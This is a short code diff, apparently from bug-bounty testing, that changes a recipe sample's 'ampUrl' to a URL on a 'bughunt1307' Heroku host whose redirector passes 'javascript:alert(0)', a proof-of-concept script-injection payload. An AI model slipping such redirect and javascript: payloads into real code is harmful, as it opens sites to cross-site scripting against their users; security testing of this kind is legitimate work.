@@ -60,7 +60,7 @@ include 'log.php';
         {
           "title": "Recipe",
           "image": "https://ampbyexample.com/img/social.png",
-          "ampUrl": "https://ampbyexample.comsamples_templates/recipe/preview/"
+          "ampUrl": "https://bughunt1307.herokuapp.com/redirector.php?x=javascript:alert(0)"
         }
       ]
     }
